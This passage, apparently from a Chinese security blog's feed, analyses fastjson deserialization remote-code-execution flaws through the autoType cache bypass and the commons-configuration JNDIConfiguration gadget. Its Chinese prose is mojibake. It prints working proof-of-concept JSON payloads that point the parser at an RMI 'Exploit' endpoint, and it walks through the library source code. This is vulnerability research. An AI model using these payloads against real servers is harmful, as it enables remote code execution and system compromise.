class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader, <span class="keyword">boolean</span> cache) &#123;</span><br><span class="line">    <span class="keyword">if</span>(className == <span class="keyword">null</span> || className.length() == <span class="number">0</span> || className.length() &gt; <span class="number">128</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Class&lt;?&gt; clazz = mappings.get(className);</span><br><span class="line">    <span class="keyword">if</span>(clazz != <span class="keyword">null</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(className.charAt(<span class="number">0</span>) == <span class="string">'['</span>)&#123;</span><br><span class="line">        Class&lt;?&gt; componentType = loadClass(className.substring(<span class="number">1</span>), classLoader);</span><br><span class="line">        <span class="keyword">return</span> Array.newInstance(componentType, <span class="number">0</span>).getClass();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(className.startsWith(<span class="string">"L"</span>) &amp;&amp; className.endsWith(<span class="string">";"</span>))&#123;</span><br><span class="line">        String newClassName = className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> loadClass(newClassName, classLoader);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(classLoader != <span class="keyword">null</span>)&#123;</span><br><span class="line">            clazz = classLoader.loadClass(className);</span><br><span class="line">            <span class="keyword">if</span> (cache) &#123;</span><br><span class="line">                mappings.put(className, clazz);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(Throwable e)&#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        <span class="comment">// skip</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader();</span><br><span class="line">        <span class="keyword">if</span>(contextClassLoader != <span class="keyword">null</span> &amp;&amp; contextClassLoader != classLoader)&#123;</span><br><span class="line">            clazz = contextClassLoader.loadClass(className);</span><br><span class="line">            <span class="keyword">if</span> (cache) &#123;</span><br><span class="line">                mappings.put(className, clazz);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(Throwable e)&#123;</span><br><span class="line">        <span class="comment">// skip</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        clazz = Class.forName(className);</span><br><span class="line">        <span class="keyword">if</span> (cache) &#123;</span><br><span class="line">            mappings.put(className, clazz);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(Throwable e)&#123;</span><br><span class="line">        <span class="comment">// skip</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>è€Œåœ¨TypeUtils.javaçš„1105è¡Œ <code>TypeUtils.getClassFromMapping</code>å‡½æ•°ï¼Œä»<code>mapping</code>ä¸­å–å‡ºç±»åã€‚<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846064362660.jpg" alt="-w737"></p><p>ç»§ç»­è·Ÿè¿›ï¼Œåœ¨1127è¡Œæœ‰ä¸€æ®µå¯¹æœªå¼€å¯<code>autoType</code>çš„å¤„ç†ï¼Œåˆæ˜¯ä¸€æ®µé»‘ç™½åå•çš„å¤„ç†ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846064362667.jpg" alt="-w1068"></p><p>æ¥ç€åŠ è½½äº†<code>org.apache.commons.configuration2.JNDIConfiguration</code>æ¨¡å—ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846064362675.jpg" alt="-w1326"><br>åŒæ—¶è¿™é‡Œåˆ¤æ–­äº†å…¶æ˜¯å¦æœ‰jsonTypeï¼Œ<code>jsonType = visitor.hasJsonType();</code>ï¼Œæ˜¯fastjsonä¸­å®šåˆ¶åºåˆ—åŒ–çš„ç‰¹æ€§ï¼Œå‚è€ƒæ–‡æ¡£<a href="https://www.w3cschool.cn/fastjson/fastjson-serializefilter.html" target="_blank" rel="noopener">Fastjson å®šåˆ¶åºåˆ—åŒ–</a>å’Œ<a href="https://www.w3cschool.cn/fastjson/fastjson-jsonfield.html" target="_blank" rel="noopener">Fastjson JSONFieldä»‹ç»</a></p><blockquote><p>æŒ–å‘ï¼Œè¿™é‡Œç”¨åˆ°äº†ASMè¯»å†™å­—èŠ‚ç çš„ç±»åº“ï¼Œå‚è€ƒæ–‡ç« <a href="https://www.blogjava.net/DLevin/archive/2014/06/25/414292.html" target="_blank" rel="noopener">æ·±å…¥ASMæºç ä¹‹ClassReaderã€ClassVisitorã€ClassWriter</a>ã€‚<br>åæ¥è¿˜çœ‹åˆ°å¯ä»¥ç”¨æ³¨è§£æœ‰JsonTypeçš„classè¿›è¡Œgadget chainæ„é€ ï¼Œå…ˆæŒ–å‘ï¼Œ<a href="https://xz.aliyun.com/t/7107?accounttraceid=2115e68bd6bf4212896bb68f3442ba84zyan" target="_blank" rel="noopener">https://xz.aliyun.com/t/7107</a></p></blockquote><p>ç»§ç»­å¾€ä¸‹è·Ÿï¼Œè¿™é‡Œåªè¦å¼€äº†<code>autoTypeSupport</code>å°±ä¼šå°†æˆ‘ä»¬çš„classç¼“å­˜è¿›<code>mapping</code>(<code>cacheClass</code>ä¸º<code>true</code>å³ç¼“å­˜)<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846064362685.jpg" alt="-w1315"></p><p>æœ€åè¿”å›classã€‚<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846064362692.jpg" alt="-w988"><br>é€šè¿‡<code>autotype</code>çš„æ£€æµ‹ï¼Œè¿›è¡Œååºåˆ—åŒ–æ“ä½œ<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846064362703.jpg" alt="-w1197"></p><p>åˆ°è¿™é‡ŒåŸºæœ¬ä»æºç å¯¹fastjsonè§£æjsonã€<code>@type</code>ç‰¹æ®Šç±»å‹è§£æã€<code>autotype</code>æ£€æµ‹æœ‰äº†ä¸€ä¸ªäº†è§£ã€‚</p><h2 id="fastjson-1-2-48-JdbcRowSetImpl-gadget-åˆ†æ-ç¼“å­˜ç»•è¿‡autotype"><a href="#fastjson-1-2-48-JdbcRowSetImpl-gadget-åˆ†æ-ç¼“å­˜ç»•è¿‡autotype" class="headerlink" title="fastjson 1.2.48 JdbcRowSetImpl gadget åˆ†æ(ç¼“å­˜ç»•è¿‡autotype)"></a>fastjson 1.2.48 JdbcRowSetImpl gadget åˆ†æ(ç¼“å­˜ç»•è¿‡autotype)</h2><p>pom.xmlæ·»åŠ ä¸‹é¢è¿™æ®µä»£ç <br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/com.alibaba/fastjson --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.47<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>poc:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        String poc1 = <span class="string">"&#123;\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"&#125;"</span>;</span><br><span class="line">        String poc2 = <span class="string">"&#123;\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://127.0.0.1:1099/Exploit\",\"autoCommit\":true&#125;"</span>;</span><br><span class="line">        JSON.parse(poc1);</span><br><span class="line">        JSON.parse(poc2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846064362715.jpg" alt="-w1266"><br>æˆ–è€…ä½¿ç”¨æ•°ç»„æˆ–è€…åœ¨webæœåŠ¡è¿ç»­å‘ä¸¤ä¸ªpocåŒ…å³å¯ï¼š<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        String poc2 = <span class="string">"[&#123;\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"&#125;,&#123;\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://127.0.0.1:1099/Exploit\",\"autoCommit\":true&#125;]"</span>;</span><br><span class="line">        JSON.parseObject(poc2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="è°ƒè¯•åˆ†æ"><a href="#è°ƒè¯•åˆ†æ" class="headerlink" title="è°ƒè¯•åˆ†æ"></a>è°ƒè¯•åˆ†æ</h3><p>ä¸‹æ–­ç‚¹æ ¹è¿›ç¬¬ä¸€ä¸ªpocï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846064362727.jpg" alt="-w1414"></p><p>å’Œä¸Šæ–‡1.2.61è°ƒè¯•çš„è¿‡ç¨‹ç±»ä¼¼<code>DefaultJSONParser</code>å‡½æ•°åˆå§‹åŒ–é…ç½®ï¼Œ<code>parser.parse</code>è§£æï¼Œå†åˆ°<code>parseObject</code>å‡½æ•°ï¼Œè¿™é‡Œç›´æ¥æ¥çœ‹<code>config.checkAutoType</code>åœ¨ä¸å¼€å¯<code>autotype</code>çš„æƒ…å†µï¼šParserConfig.java#checkAutoType<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846064362743.jpg" alt="-w1224"></p><p>æœ€å¼€å§‹è¿›è¡Œclassåçš„å“ˆå¸Œè¿ç®—ï¼Œç„¶åæ˜¯å¼€å¯autotypeä¸‹çš„é»‘ç™½åå•æ£€æµ‹ï¼Œç„¶åè¿˜æ²¡åˆ°åè¾¹æœªå¼€å¯autotypeçš„ifæ¡ä»¶é‡Œï¼Œå°±ç›´æ¥returnäº†ã€‚</p><p>å›åˆ°DefaultJSONParser.java#parseObjectå‡½æ•°<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846064362759.jpg" alt="-w1269"><br>è·Ÿè¿›<code>deserializer.deserialze</code>å‡½æ•°ï¼Œæ ¹æ®<code>val</code>å­—æ®µæ¥è·å–<code>objVal</code>ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846064362776.jpg" alt="-w1235"></p><p><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846064362788.jpg" alt="-w675"></p><p>ç»§ç»­å¾€ä¸‹ï¼Œåœ¨335è¡Œè¿›è¡Œäº†ä¸€ä¸ª<code>Class</code>ç±»çš„åˆ¤æ–­ï¼Œç„¶åè°ƒç”¨<code>typeUtils.loadClass</code>å‡½æ•°ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846064362803.jpg" alt="-w1287"></p><p>TypeUtils.java#loadClass(String className, ClassLoader classLoader)<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846064362820.jpg" alt="-w1419"><br>ç”¨é‡è½½çš„æ–¹å¼ï¼Œå¹¶ä¸”è®¾ç½®é»˜è®¤ä¸º<code>true</code>çš„ç¼“å­˜æ“ä½œï¼Œæœ€ååœ¨TypeUtils.java#1242è¡Œå°†<code>com.sun.rowset.JdbcRowSetImpl</code>åŠ åˆ°mappingç¼“å­˜ä¸­ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846064362835.jpg" alt="-w1243"></p><p>è¿™å°±å¯¼è‡´äº†è§£æç¬¬äºŒä¸ªpocæ—¶ï¼Œç»•è¿‡äº†autotypeæ ¡éªŒï¼Œä»ç¼“å­˜mappingä¸­åŠ è½½ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846064362848.jpg" alt="-w1464"><br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846064362862.jpg" alt="-w1104"><br>æœ€ç»ˆå®ä¾‹åŒ–è¯¥ç±»ï¼Œå¯¼è‡´RCEã€‚</p><h2 id="æœ€å"><a href="#æœ€å" class="headerlink" title="æœ€å"></a>æœ€å</h2><p>è¿™ç¯‡æ–‡ç« é€šè¿‡fastjson1.2.61 commons-configuration gadgetçš„POCåŠ¨æ€è°ƒè¯•å…¥æ‰‹ï¼Œåˆ†æfastjsonååºåˆ—åŒ–è§£æjsonæµç¨‹ï¼Œåˆ†æäº†ä¸€ä¸‹æºç çš„<code>\u</code>å’Œ<code>\x</code>çš„16è¿›åˆ¶è§£ç æ“ä½œï¼Œä»¥åŠç¼“å­˜æœºåˆ¶ã€‚</p><p>åŒæ—¶åˆ†æäº†ä¸€ä¸‹åœ¨fastjson 1.2.48ä»¥ä¸‹<code>TypeUtils.loadClass</code>ç¼“å­˜é—®é¢˜ï¼Œå³æ— éœ€å¼€autotypeå¯ä»¥å‘½ä»¤æ‰§è¡Œã€‚</p><p>æ¥ä¸‹æ¥çš„æ—¶é—´æ‰“ç®—ç ”ç©¶ä¸€ä¸‹é«˜ç‰ˆæœ¬jdkç»•è¿‡è¿œç¨‹ç±»çš„åŠ è½½é—®é¢˜ã€‚</p><p>å‚è€ƒæ–‡ç« ï¼š</p><ul><li><a href="https://github.com/alibaba/fastjson/wiki/FastJson-%E6%96%87%E6%A1%A3%E9%93%BE%E6%8E%A5" target="_blank" rel="noopener">FastJson æ–‡æ¡£é“¾æ¥</a></li><li><a href="https://www.w3cschool.cn/fastjson/fastjson-api.html" target="_blank" rel="noopener">W3Cschool:Fastjson APIä¸­æ–‡ç‰ˆ</a></li><li><a href="https://zonghaishang.gitbooks.io/fastjson-source-code-analysis/content/" target="_blank" rel="noopener">fastjsonæºç è§£æ</a></li><li><a href="https://xz.aliyun.com/t/7107" target="_blank" rel="noopener">fastjsonååºåˆ—åŒ–RCEæ ¸å¿ƒ-å››ä¸ªå…³é”®ç‚¹åˆ†æ</a></li><li><a href="https://paper.seebug.org/994/" target="_blank" rel="noopener">https://paper.seebug.org/994/</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="Web" scheme="https://0day.design/categories/Web/"/>
    
    
      <category term="Java" scheme="https://0day.design/tags/Java/"/>
    
      <category term="æ¼æ´åˆ†æ" scheme="https://0day.design/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
      <category term="fastjson" scheme="https://0day.design/tags/fastjson/"/>
    
  </entry>
  
  <entry>
    <title>fastjson 1.2.61 è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æ(commons-configuration gadget)</title>
    <link href="https://0day.design/2020/01/28/fastjson%201.2.61%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://0day.design/2020/01/28/fastjson 1.2.61 è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æ/</id>
    <published>2020-01-28T13:45:00.000Z</published>
    <updated>2020-03-19T12:47:56.505Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>åœ¨fastjson 1.2.61çš„ç‰ˆæœ¬ä¸­ï¼Œå¢åŠ äº†autoTypeçš„å®‰å…¨ç»„ä»¶é»‘åå•commons-configurationï¼ŒæˆåŠŸç»•è¿‡äº†é»‘åå•é™åˆ¶ï¼Œåˆ©ç”¨ååºåˆ—åŒ–ç‰¹æ€§é€ æˆè¿œç¨‹ä»£ç æ‰§è¡Œï¼Œè¯¥ç»„ä»¶æ˜¯javaåº”ç”¨ç¨‹åºçš„é…ç½®ç®¡ç†ç±»ï¼Œç”¨äºååŠ©ç®¡ç†å„ç§æ ¼å¼çš„é…ç½®æ–‡ä»¶ã€‚</p><h2 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h2><p>Ideaåˆ›å»ºé¡¹ç›®ï¼Œé€‰æ‹©mavenï¼Œjdkç‰ˆæœ¬1.8.0_73ï¼Œåœ¨pom.xmlä¸­æ·»åŠ å¦‚ä¸‹ä»£ç ,è‡ªåŠ¨åŠ è½½ä¾èµ–ï¼š</p><ul><li>fastjson:1.2.60</li><li>commons-configuration2: 2.6</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/com.alibaba/fastjson --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.60<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.commons/commons-configuration2 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-configuration2<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><p>åŒæ ·çš„ï¼ŒæŒ‰ç…§<a href="https://0day.design/2020/01/28/CVE-2019-14540%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">ä¸Šä¸€ç¯‡æ–‡ç« </a>æ–‡ç« ä¸­å†™çš„ï¼Œæ­å»ºä¸€ä¸ªæ¶æ„çš„RMIæœåŠ¡ï¼Œä½¿ä¹‹åŠ è½½ã€‚<br>poc:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">exp</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        String poc = <span class="string">"&#123;\"@type\":\"org.apache.commons.configuration2.JNDIConfiguration\",\"prefix\":\"rmi://127.0.0.1:1099/Exploit\"&#125;"</span>;</span><br><span class="line">        ParserConfig.global.setAutoTypeSupport(<span class="keyword">true</span>);</span><br><span class="line">        JSON.parseObject(poc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846065185779.jpg" alt="-w1479"></p><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>åœ¨<a href="https://0day.design/2020/01/28/CVE-2019-14540%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">ä¸Šä¸€ç¯‡æ–‡ç« </a>ä¸­å†™äº†fastjsonåœ¨ååºåˆ—åŒ–jsonæ•°æ®æ—¶ï¼Œä¼šè‡ªåŠ¨è°ƒç”¨å…¶å±æ€§XXçš„<code>setXX</code>å’Œ<code>getXX</code>æ–¹æ³•ï¼Œå¦‚æœå…¶ä¸­æœ‰<code>JNDI Reference</code>æ³¨å…¥æ¼æ´ï¼Œåˆ™å¯ä»¥é€ æˆRCEçš„æ•ˆæœã€‚</p><p>åœ¨ä¸‹é¢è¿™æ®µä»£ç ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“åœ¨ä½¿ç”¨<code>JSON.parseObject</code>ååºåˆ—åŒ–jsonæ•°æ®æ—¶ï¼Œä¼šè°ƒç”¨æ‰€æœ‰å±æ€§çš„getæ–¹æ³•ï¼Œä»¥åŠç›¸å…³å±æ€§çš„setæ–¹æ³•ã€‚<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"getAgeæ–¹æ³•è¢«è‡ªåŠ¨è°ƒç”¨ï¼"</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"setAgeæ–¹æ³•è¢«è‡ªåŠ¨è°ƒç”¨ï¼"</span>);</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"getNameæ–¹æ³•è¢«è‡ªåŠ¨è°ƒç”¨ï¼"</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"setNameæ–¹æ³•è¢«è‡ªåŠ¨è°ƒç”¨ï¼"</span>);</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//ä½¿ç”¨@typeæŒ‡å®šè¯¥JSONå­—ç¬¦ä¸²åº”è¯¥è¿˜åŸæˆä½•ç§ç±»å‹çš„å¯¹è±¡</span></span><br><span class="line">        String userInfo = <span class="string">"&#123;\"@type\":\"test.User\",\"name\":\"passer6y\"&#125;"</span>;</span><br><span class="line">        <span class="comment">//å¼€å¯setAutoTypeSupportæ”¯æŒautoType</span></span><br><span class="line">        ParserConfig.global.setAutoTypeSupport(<span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">//ååºåˆ—åŒ–æˆUserå¯¹è±¡</span></span><br><span class="line">        JSONObject user = JSON.parseObject(userInfo);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>ä»ä¸‹å›¾æˆ‘ä»¬çŸ¥é“ï¼Œè¿™é‡Œæ²¡æœ‰è®¾ç½®ageå±æ€§ï¼Œä½†æ˜¯<code>getAge</code>æ–¹æ³•è¢«è°ƒç”¨äº†ï¼Œä¸”å…ˆè°ƒç”¨<code>set</code>æ–¹æ³•åè°ƒç”¨<code>get</code>æ–¹æ³•ã€‚<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846065185788.jpg" alt="-w1118"></p><p>å†å›è¿‡å¤´æ¥çœ‹è¿™ä¸ªpoc:<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String poc = "&#123;\"@type\":\"org.apache.commons.configuration2.JNDIConfiguration\",\"prefix\":\"rmi://127.0.0.1:1099/Exploit\"&#125;";</span><br></pre></td></tr></table></figure></p><p>è·Ÿè¿›è¿™ä¸ªç»„ä»¶çš„<code>setPrefix</code>æ–¹æ³•ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846065185797.jpg" alt="-w982"><br>å†è·Ÿä¸€ä¸‹æˆå‘˜å˜é‡<code>this.prefix</code>ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846065185805.jpg" alt="-w1370"><br>æ‰€ä»¥æ¼æ´æˆå› å°±æ˜¾è€Œæ˜“è§äº†ï¼Œé€šè¿‡ç¬¬ä¸€æ­¥çš„<code>setPrefix</code>ç§å…¥æˆå‘˜å˜é‡<code>this.prefix</code>ä¸ºæ¶æ„rmiæœåŠ¡åœ°å€ï¼Œæ¥ç€fastjsonè‡ªåŠ¨è°ƒç”¨å…¨éƒ¨getæ–¹æ³•ï¼Œæ²¡æœ‰è®¾ç½®<code>baseContext</code>æˆå‘˜å˜é‡ï¼Œè‡ªç„¶å°±è§¦å‘äº†ï¼š<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(Context)<span class="keyword">this</span>.getContext().lookup(<span 